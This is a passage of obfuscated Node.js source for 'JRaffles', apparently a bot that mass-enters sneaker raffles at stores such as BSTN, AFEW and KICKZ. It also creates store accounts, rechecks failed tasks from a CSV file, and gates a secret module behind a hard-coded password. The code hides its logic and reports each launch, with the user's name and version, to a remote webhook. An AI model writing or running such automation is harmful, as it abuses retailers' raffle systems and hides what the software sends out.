    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x55eeb4(_0x33f673) {
    var _0x29ddb8 = await _0x32c942(), _0x2fdf06 = _0x3e92a1['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x2add43 = _0x1c3b5f['parse'](_0x2fdf06, { 'header': !![] })['data'];
    for (var _0x3240b0 = 0x0; _0x3240b0 < _0x2add43['length']; _0x3240b0++) {
        var _0x3e9267 = _0x2add43[_0x3240b0]['Store'], _0x975444 = _0x2add43[_0x3240b0]['Mode'];
        for (var _0x3382cd of _0x4f8d63) {
            const _0x108b74 = _0x3382cd['name']['includes'](_0x3e9267);
            if (_0x108b74)
                for (mode of _0x4f8d63[_0x3382cd]['modules']) {
                    const _0x3966ae = mode['name']['includes'](_0x975444);
                    _0x3966ae && (_0x33f673 = mode['name'], await mode['function'](_0x33f673, _0x2add43[_0x3240b0], _0x29ddb8));
                }
        }
    }
}
async function _0x392169() {
    await _0x5d6a0d(), console['clear']();
    _0x24de00['threads'] > 0x5 && (_0x24de00['threads'] = 0x5);
    if (_0x5e0c2d != 'devkey') {
        let _0x42bf9f = await _0xbd460d['autoUpdate']();
        if (_0x42bf9f === 'yes')
            return _0x2f1245('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x3ed4c4 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x254c61(0x2710);
        ;
    }
    await _0x3eeb2d(_0x3ed4c4);
    if (_0x534b1b === ![])
        return console['log']('Closing\x20Browser'), await _0x254c61(0xbb8);
    else
        try {
            var _0x38491b = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4a1218
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5e0c2d
                    }
                ]
            }];
            const _0x2de12f = { 'embeds': _0x38491b };
            var _0x534b44 = await _0x18ad5f(null, null, 'open', ![]);
            const _0x1dc249 = { 'openDEVMSG': { 'embeds': [_0x534b44] } };
            await _0x2dfd24(_0xb72752, _0x1dc249['openDEVMSG']);
            async function _0x49a4d8() {
                _0x1bf238('JRaffles\x20' + _0x5e0c2d), console['clear'](), console['log']('Hello\x20' + _0x467028['cyan']('' + _0x4a1218) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5e0c2d), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1e8971 = 0x0; _0x1e8971 < _0x4f8d63['length'] - 0x4; _0x1e8971++) {
                    if (_0x1e8971 >= 0xa) {
                        console['log']('\x20(' + _0x1e8971 + ')\x20[' + _0x4f8d63[_0x1e8971]['name'] + ']');
                        continue;
                    }
                    if (_0x4f8d63[_0x1e8971]['name'] === 'Reload\x20Settings' || _0x4f8d63[_0x1e8971]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1e8971 + ')\x20\x20[' + _0x4f8d63[_0x1e8971]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x4f8d63['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x4f8d63['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x4f8d63['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x4f8d63['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x410da7();
                if (taskModule > _0x4f8d63['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x254c61(0x3e8), _0x49a4d8();
                if (_0x4f8d63[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x17b9d0 = await _0x32c942();
                            await _0x489772['function'](_0x489772, _0x17b9d0);
                        }
                        if (taskFunction == 0x2) {
                            var _0x17b9d0 = await _0x32c942(), _0x5253be = await _0xb49fc3(_0x489772);
                            _0x24de00['shuffleTasks'] && await _0x136293(_0x5253be), await _0x489772['function'](_0x489772, _0x5253be, _0x17b9d0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x17b9d0 = await _0x32c942(), _0x5253be = await _0xb49fc3(_0x489772);
                                _0x24de00['shuffleTasks'] && await _0x136293(_0x5253be), await _0x489772['function'](_0x489772, _0x5253be, _0x17b9d0);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x17b9d0 = await _0x32c942();
                                    await _0x489772['function'](_0x489772, _0x17b9d0);
                                }
                            }
                        }
                    } catch (_0x21df98) {
                        console['log'](_0x21df98), await _0x254c61(0x7d0);
                    }
                    return _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                        var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x17b9d0 = await _0x32c942(), _0x1169f6 = await _0xb49fc3(_0x489772);
                            _0x24de00['shuffleTasks'] && await _0x136293(_0x1169f6), await _0x489772['function'](_0x489772, _0x1169f6, _0x17b9d0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x17b9d0 = await _0x32c942(), _0x1169f6 = await _0xb49fc3(_0x489772);
                                _0x24de00['shuffleTasks'] && await _0x136293(_0x1169f6), await _0x489772['function'](_0x489772, _0x1169f6, _0x17b9d0);
                            }
                        }
                    } catch (_0x167c4c) {
                        console['log'](_0x167c4c), await _0x254c61(0xfa0);
                    }
                    return _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                        var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x17b9d0 = await _0x32c942(), _0x1169f6 = await _0xb49fc3(_0x489772);
                            _0x24de00['shuffleTasks'] && await _0x136293(_0x1169f6), await _0x489772['function'](_0x489772, _0x1169f6, _0x17b9d0);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x17b9d0 = await _0x32c942(), _0x1169f6 = await _0xb49fc3(_0x489772);
                                _0x24de00['shuffleTasks'] && await _0x136293(_0x1169f6), await _0x489772['function'](_0x489772, _0x1169f6, _0x17b9d0);
                            }
                        }
                    } catch (_0x5714a0) {
                        console['log'](_0x5714a0), await _0x254c61(0xfa0);
                    }
                    return _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x17b9d0 = await _0x32c942();
                        return await _0x489772['function'](_0x489772, _0x17b9d0), _0x49a4d8();
                    }
                    var _0x17b9d0 = await _0x32c942(), _0x180815 = await _0xb49fc3(_0x489772);
                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x180815), await _0x489772['function'](_0x489772, _0x180815, _0x17b9d0), _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x17b9d0 = await _0x32c942(), _0x180815 = await _0xb49fc3(_0x489772);
                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x180815), await _0x489772['function'](_0x489772, _0x180815, _0x17b9d0), _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x17b9d0 = await _0x32c942(), _0x180815 = await _0xb49fc3(_0x489772);
                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x180815), await _0x489772['function'](_0x489772, _0x180815, _0x17b9d0), _0x49a4d8();
                }
                if (_0x4f8d63[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x17b9d0 = await _0x32c942(), _0x180815 = await _0xb49fc3(_0x489772);
                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x180815), await _0x489772['function'](_0x489772, _0x180815, _0x17b9d0), _0x49a4d8();
                } else {
                    if (_0x4f8d63[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                        var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x17b9d0 = await _0x32c942(), _0x2ba8c8 = await _0xb49fc3(_0x489772);
                            return _0x24de00['shuffleTasks'] && await _0x136293(_0x2ba8c8), await _0x489772['function'](_0x489772, _0x2ba8c8, _0x17b9d0), _0x49a4d8();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x17b9d0 = await _0x32c942();
                                return await _0x489772['function'](_0x489772, null, _0x17b9d0), _0x49a4d8();
                            }
                        }
                        ;
                    } else {
                        if (_0x4f8d63[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                            var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction], _0x17b9d0 = await _0x32c942(), _0x517f88 = await _0xb49fc3(_0x489772);
                            return _0x24de00['shuffleTasks'] && await _0x136293(_0x517f88), await _0x489772['function'](_0x489772, _0x517f88, _0x17b9d0), await _0x254c61(0x1388), _0x49a4d8();
                        } else {
                            if (_0x4f8d63[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x40be4b = { 'headers': { 'content-type': 'application/json' } }, _0x61124a = { 'key': _0x3ed4c4 }, _0x560aee = await _0x4127f6['post']('https://jraffles.herokuapp.com/beta', _0x61124a, _0x40be4b);
                                    if (_0x560aee['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x467028['cyan'](_0x4a1218) + '.\x20Beta\x20Access\x20Granted.'), await _0x254c61(0x3e8);
                                } catch (_0x320227) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x254c61(0x7d0), _0x49a4d8();
                                }
                                taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction], _0x17b9d0 = await _0x32c942(), _0x517f88 = await _0xb49fc3(_0x489772);
                                return _0x24de00['shuffleTasks'] && await _0x136293(_0x517f88), await _0x489772['function'](_0x489772, _0x517f88, _0x17b9d0), await _0x254c61(0x1388), _0x49a4d8();
                            } else {
                                if (_0x4f8d63[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x17b9d0 = await _0x32c942(), _0x2ba8c8 = await _0xb49fc3(_0x489772);
                                        return _0x24de00['shuffleTasks'] && await _0x136293(_0x2ba8c8), await _0x489772['function'](_0x489772, _0x2ba8c8, _0x17b9d0), _0x49a4d8();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x17b9d0 = await _0x32c942();
                                            return await _0x489772['function'](_0x489772, null, _0x17b9d0), _0x49a4d8();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x4f8d63[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                        var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x489772);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x4f8d63[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                            var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x17b9d0 = await _0x32c942(), _0x3cd84a = await _0xb49fc3(_0x489772);
                                                return _0x24de00['shuffleTasks'] && await _0x136293(_0x3cd84a), await _0x489772['function'](_0x489772, _0x3cd84a, _0x17b9d0), _0x49a4d8();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x17b9d0 = await _0x32c942(), _0x3cd84a = await _0xb49fc3(_0x489772);
                                                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x3cd84a), await _0x489772['function'](_0x489772, _0x3cd84a, _0x17b9d0), _0x49a4d8();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x4f8d63[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                                var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x17b9d0 = await _0x32c942(), _0x2e1e8e = await _0xb49fc3(_0x489772);
                                                    return _0x24de00['shuffleTasks'] && await _0x136293(_0x2e1e8e), await _0x489772['function'](_0x489772, _0x2e1e8e, _0x17b9d0), _0x49a4d8();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x17b9d0 = await _0x32c942(), _0x2e1e8e = await _0xb49fc3(_0x489772);
                                                        return _0x24de00['shuffleTasks'] && await _0x136293(_0x2e1e8e), await _0x489772['function'](_0x489772, _0x2e1e8e, _0x17b9d0), _0x49a4d8();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x4f8d63[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x17b9d0 = await _0x32c942(), _0x2f7139 = await _0xb49fc3(_0x489772);
                                                        return _0x24de00['shuffleTasks'] && await _0x136293(_0x2f7139), await _0x489772['function'](_0x489772, _0x2f7139, _0x17b9d0), _0x49a4d8();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x17b9d0 = await _0x32c942(), _0x2f7139 = await _0xb49fc3(_0x489772);
                                                            return _0x24de00['shuffleTasks'] && await _0x136293(_0x2f7139), await _0x489772['function'](_0x489772, _0x2f7139, _0x17b9d0), _0x49a4d8();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x4f8d63[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                                        var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x17b9d0 = await _0x32c942(), _0x3d69bc = await _0xb49fc3(_0x489772);
                                                            return _0x24de00['shuffleTasks'] && await _0x136293(_0x3d69bc), await _0x489772['function'](_0x489772, _0x3d69bc, _0x17b9d0), _0x49a4d8();
                                                        }
                                                    } else {
                                                        if (_0x4f8d63[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x254c61(0x3e8), _0x49a4d8();
                                                        else {
                                                            if (_0x4f8d63[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x275ce6 = _0x4f8d63[taskModule]['name'], _0x17b9d0 = await _0x32c942();
                                                                return await _0x1f1860(_0x275ce6, _0x17b9d0), _0x49a4d8();
                                                            } else {
                                                                if (_0x4f8d63[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x31037d(_0x4f8d63[taskModule]['modules']);
                                                                    var _0x489772 = _0x4f8d63[taskModule]['modules'][taskFunction];
                                                                    return await _0x489772['function'](_0x489772), _0x49a4d8();
                                                                } else {
                                                                    if (_0x4f8d63[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x15ac72 = 0x0;
                                                                        for (const _0x400b4f in _0x24de00) {
                                                                            console['log']('(' + _0x15ac72 + ')\x20' + _0x400b4f + '\x20:\x20' + _0x24de00[_0x400b4f]), _0x15ac72++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x15ac72 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x332b90 = await _0x5a592b();
                                                                        if (_0x332b90 == _0x15ac72)
                                                                            return _0x49a4d8();
                                                                        console['clear'];
                                                                        var _0x398897 = 0x0;
                                                                        for (var _0x452fbc in _0x24de00) {
                                                                            if (_0x332b90 == _0x398897) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x452fbc + '\x20:'), _0x24de00[_0x452fbc] = await _0x325e57(), _0x3e92a1['writeFileSync']('../settings.json', JSON['stringify'](_0x24de00));
                                                                                break;
                                                                            } else
                                                                                _0x398897++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x254c61(0xbb8), _0x49a4d8();
                                                                    } else {
                                                                        if (_0x4f8d63[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x5d6a0d(), _0x49a4d8();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x4f8d63[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x2e29b9 = await _0x24b8de();
                                                                                _0x2e29b9 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x568365(), await afewFunction(_0x5af398[_0x2e9704], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x254c61(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x49a4d8();
            } catch (_0x1060c4) {
                return console['log'](_0x1060c4), await _0x254c61(0x2710), _0x49a4d8();
            }
        } catch (_0x2b08a3) {
            return console['log'](_0x2b08a3), await _0x254c61(0x3a98);
        }
}
;
_0x1bf238('JRaffles\x20' + _0x5e0c2d);
try {
    _0x5d6a0d(), _0x392169();
} catch (_0x53f376) {
    console['log'](_0x53f376);
}